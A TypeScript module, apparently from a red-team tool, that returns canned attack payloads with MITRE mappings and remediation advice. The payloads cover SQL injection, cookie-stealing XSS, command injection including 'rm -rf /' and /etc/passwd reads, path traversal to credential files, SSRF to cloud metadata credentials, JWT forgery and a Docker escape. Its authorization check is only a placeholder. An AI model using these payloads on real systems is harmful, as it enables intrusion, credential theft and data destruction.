/**
 * Red Team Payload Generator
 * Generates educational attack payloads for authorized penetration testing
 * All payloads must include AUTHORIZED TESTING ONLY header
 */

import { getMitreMapping } from './mitre-mapper'
import { estimateCVSSByType } from './cvss-calculator'

export interface GeneratedPayload {
  id: string
  vulnType: string
  payload: string
  description: string
  mitreId: string
  cvssScore: number
  remediation: string
  engagementId: string
}

/**
 * Generate attack payload for authorized testing
 * @param vulnType - Vulnerability type (sql_injection, xss, etc.)
 * @param target - Target component/endpoint
 * @param engagementId - Engagement ID for authorization tracking
 * @returns Generated payload with educational header
 */
export function generatePayload(
  vulnType: string,
  target: string,
  engagementId: string
): GeneratedPayload {
  const payloads: Record<string, { code: string; description: string; remediation: string }> = {
    sql_injection: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1190 — Exploit Public-Facing Application

-- Blind SQL Injection (Time-based)
POST /api/v1/login HTTP/1.1
Content-Type: application/json

{
  "email": "admin' OR SLEEP(5)--",
  "password": "anything"
}

-- Union-based SQLi
GET /api/search?q=1' UNION SELECT username, password FROM users--

-- Boolean-based blind
GET /api/user?id=1' OR '1'='1`,
      description: 'SQL injection vulnerability allowing unauthorized database access and potential authentication bypass',
      remediation: 'Implement parameterized queries/prepared statements. Use input validation and WAF rules.',
    },
    xss: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1059 — Command & Scripting Interpreter

<!-- Reflected XSS payload -->
<script>
  fetch('/api/exfil', {
    method: 'POST',
    body: JSON.stringify({ cookies: document.cookie })
  })
</script>

<!-- Event-based XSS -->
<img src=x onerror="fetch('/api/exfil?data=' + document.cookie)">

<!-- DOM-based XSS -->
<svg onload="eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))">`,
      description: 'Cross-site scripting (XSS) allows execution of arbitrary JavaScript in victim browsers',
      remediation: 'Sanitize all user inputs. Use HTML entity encoding. Implement Content Security Policy (CSP) headers.',
    },
    command_injection: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1059 — Command & Scripting Interpreter

# Via parameter
GET /api/execute?cmd=id;whoami;uname%20-a HTTP/1.1

# Via POST body
POST /api/process HTTP/1.1
Content-Type: application/json

{
  "filename": "test.txt; cat /etc/passwd > /tmp/exfil.txt"
}

# Bash command chaining
'; rm -rf / || true; echo '`,
      description: 'Command injection enables execution of arbitrary system commands on the target',
      remediation: 'Avoid shell execution. Use language APIs instead. Implement strict input whitelist validation.',
    },
    path_traversal: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1083 — File and Directory Discovery

# Directory traversal
GET /api/file?path=../../../etc/passwd HTTP/1.1

# Encoded traversal
GET /api/download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1

# Backslash traversal (Windows)
GET /api/read?file=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1

# Double encoding
GET /api/serve?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1`,
      description: 'Path traversal allows unauthorized access to arbitrary files and directories',
      remediation: 'Implement path canonicalization. Whitelist allowed directories. Validate against absolute paths.',
    },
    ssrf: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1090 — Proxy

# SSRF to internal endpoint
POST /api/proxy HTTP/1.1
Content-Type: application/json

{
  "url": "http://internal-admin:8000/secret-api"
}

# AWS metadata access
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}

# Gopher protocol exploitation
{
  "url": "gopher://internal-db:3306/_QUIT%0d%0a"
}`,
      description: 'Server-side request forgery allows making requests from target server to internal systems',
      remediation: 'Implement URL whitelist. Disable access to internal IPs and cloud metadata. Use egress filtering.',
    },
    auth_bypass: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1078 — Valid Accounts

// JWT with "none" algorithm
{
  "alg": "none",
  "typ": "JWT"
}
.
{
  "sub": "admin",
  "role": "administrator",
  "exp": 9999999999
}
.

// Header injection bypass
GET /api/admin HTTP/1.1
X-Admin-User: true
X-Original-User: admin

// Cookie manipulation
Cookie: admin=true; role=administrator`,
      description: 'Authentication bypass allows unauthorized access without valid credentials',
      remediation: 'Always verify JWT signatures. Remove debug modes. Validate user roles server-side on every request.',
    },
    privilege_escalation: {
      code: `// AUTHORIZED TESTING ONLY — HemisX Engagement: ${engagementId}
// MITRE ATT&CK: T1068 — Exploitation for Privilege Escalation

# Kernel exploit targeting unpatched vulnerability
gcc -o exploit exploit.c && ./exploit

# SUID binary exploitation
find / -perm -4000 2>/dev/null

# Docker escape attempt
docker run --rm -it -v /:/host alpine chroot /host /bin/bash

# Sudo vulnerability exploitation
sudo -l  # Check sudo permissions`,
      description: 'Privilege escalation enables attackers to gain higher-level system access',
      remediation: 'Keep systems patched. Apply principle of least privilege. Monitor and restrict sudo/SUID binaries.',
    },
  }

  const config = payloads[vulnType.toLowerCase()] || payloads.sql_injection
  const mitre = getMitreMapping(vulnType)
  const cvss = estimateCVSSByType(vulnType)

  return {
    id: `payload_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
    vulnType,
    payload: config.code,
    description: config.description,
    mitreId: mitre.techniqueId,
    cvssScore: cvss.score,
    remediation: config.remediation,
    engagementId,
  }
}

/**
 * Validate that an engagement is authorized before payload generation
 * @param engagementId - ID to check authorization
 * @returns True if authorized, false otherwise
 */
export function isAuthorizedEngagement(engagementId: string): boolean {
  // Mock implementation: check that engagement ID is non-empty
  // In production, this would query the database for authorization record
  return !!(engagementId && engagementId.trim().length > 0)
}

/**
 * Get list of supported vulnerability types
 */
export function getSupportedVulnTypes(): string[] {
  return [
    'sql_injection',
    'xss',
    'command_injection',
    'path_traversal',
    'ssrf',
    'auth_bypass',
    'privilege_escalation',
  ]
}
